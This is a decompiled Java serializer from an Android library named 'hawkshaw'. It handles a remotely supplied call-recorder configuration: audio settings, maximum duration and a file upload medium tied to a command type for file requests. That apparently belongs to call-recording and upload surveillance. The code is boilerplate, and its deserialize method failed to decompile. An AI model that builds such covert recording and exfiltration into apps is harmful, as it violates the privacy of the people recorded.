package com.hawkshaw.library.datalayer.models;

import D3.b;
import E3.C0029h0;
import E3.H;
import E3.O;
import E3.u0;
import Y1.K;
import com.hawkshaw.library.datalayer.models.DynamicConfig;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;

public final class DynamicConfig$CallRecorder$$serializer implements H {
    public static final DynamicConfig$CallRecorder$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        DynamicConfig$CallRecorder$$serializer dynamicConfig$CallRecorder$$serializer = new DynamicConfig$CallRecorder$$serializer();
        INSTANCE = dynamicConfig$CallRecorder$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.DynamicConfig.CallRecorder", dynamicConfig$CallRecorder$$serializer, 8);
        pluginGeneratedSerialDescriptor.l("audio_source", true);
        pluginGeneratedSerialDescriptor.l("output_format", true);
        pluginGeneratedSerialDescriptor.l("audio_encoder", true);
        pluginGeneratedSerialDescriptor.l("audio_encoding_bit_rate", true);
        pluginGeneratedSerialDescriptor.l("audio_sampling_rate", true);
        pluginGeneratedSerialDescriptor.l("max_duration_ms", true);
        pluginGeneratedSerialDescriptor.l("output_file_extension", true);
        pluginGeneratedSerialDescriptor.l("file_upload_medium", true);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private DynamicConfig$CallRecorder$$serializer() {
    }

    public KSerializer[] childSerializers() {
        KSerializer kSerializer = DynamicConfig.CallRecorder.$childSerializers[7];
        O o4 = O.f456a;
        return new KSerializer[]{o4, o4, o4, o4, o4, o4, u0.f536a, kSerializer};
    }

    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r4v8, resolved type: java.lang.Object} */
    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r15v3, resolved type: com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium} */
    /* JADX WARNING: Multi-variable type inference failed */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public com.hawkshaw.library.datalayer.models.DynamicConfig.CallRecorder deserialize(kotlinx.serialization.encoding.Decoder r18) {
        /*
            r17 = this;
            r0 = r18
            java.lang.String r1 = "decoder"
            Y1.K.n(r0, r1)
            kotlinx.serialization.descriptors.SerialDescriptor r1 = r17.getDescriptor()
            D3.a r0 = r0.a(r1)
            kotlinx.serialization.KSerializer[] r2 = com.hawkshaw.library.datalayer.models.DynamicConfig.CallRecorder.$childSerializers
            r3 = 1
            r5 = 0
            r14 = r5
            r15 = r14
            r7 = 0
            r8 = 0
            r9 = 0
            r10 = 0
            r11 = 0
            r12 = 0
            r13 = 0
            r5 = r3
        L_0x001f:
            if (r5 == 0) goto L_0x0075
            int r6 = r0.y(r1)
            switch(r6) {
                case -1: goto L_0x0072;
                case 0: goto L_0x006a;
                case 1: goto L_0x0063;
                case 2: goto L_0x005b;
                case 3: goto L_0x0053;
                case 4: goto L_0x004b;
                case 5: goto L_0x0043;
                case 6: goto L_0x003b;
                case 7: goto L_0x002e;
                default: goto L_0x0028;
            }
        L_0x0028:
            B3.m r0 = new B3.m
            r0.<init>(r6)
            throw r0
        L_0x002e:
            r6 = 7
            r4 = r2[r6]
            java.lang.Object r4 = r0.l(r1, r6, r4, r15)
            r15 = r4
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium r15 = (com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium) r15
            r7 = r7 | 128(0x80, float:1.8E-43)
            goto L_0x001f
        L_0x003b:
            r4 = 6
            java.lang.String r14 = r0.q(r1, r4)
            r7 = r7 | 64
            goto L_0x001f
        L_0x0043:
            r4 = 5
            int r13 = r0.s(r1, r4)
            r7 = r7 | 32
            goto L_0x001f
        L_0x004b:
            r4 = 4
            int r12 = r0.s(r1, r4)
            r7 = r7 | 16
            goto L_0x001f
        L_0x0053:
            r4 = 3
            int r11 = r0.s(r1, r4)
            r7 = r7 | 8
            goto L_0x001f
        L_0x005b:
            r4 = 2
            int r10 = r0.s(r1, r4)
            r7 = r7 | 4
            goto L_0x001f
        L_0x0063:
            int r9 = r0.s(r1, r3)
            r7 = r7 | 2
            goto L_0x001f
        L_0x006a:
            r4 = 0
            int r8 = r0.s(r1, r4)
            r7 = r7 | 1
            goto L_0x001f
        L_0x0072:
            r4 = 0
            r5 = r4
            goto L_0x001f
        L_0x0075:
            r0.c(r1)
            com.hawkshaw.library.datalayer.models.DynamicConfig$CallRecorder r0 = new com.hawkshaw.library.datalayer.models.DynamicConfig$CallRecorder
            r16 = 0
            r6 = r0
            r6.<init>((int) r7, (int) r8, (int) r9, (int) r10, (int) r11, (int) r12, (int) r13, (java.lang.String) r14, (com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium) r15, (E3.q0) r16)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.DynamicConfig$CallRecorder$$serializer.deserialize(kotlinx.serialization.encoding.Decoder):com.hawkshaw.library.datalayer.models.DynamicConfig$CallRecorder");
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, DynamicConfig.CallRecorder callRecorder) {
        K.n(encoder, "encoder");
        K.n(callRecorder, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        DynamicConfig.CallRecorder.write$Self$library_release(callRecorder, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
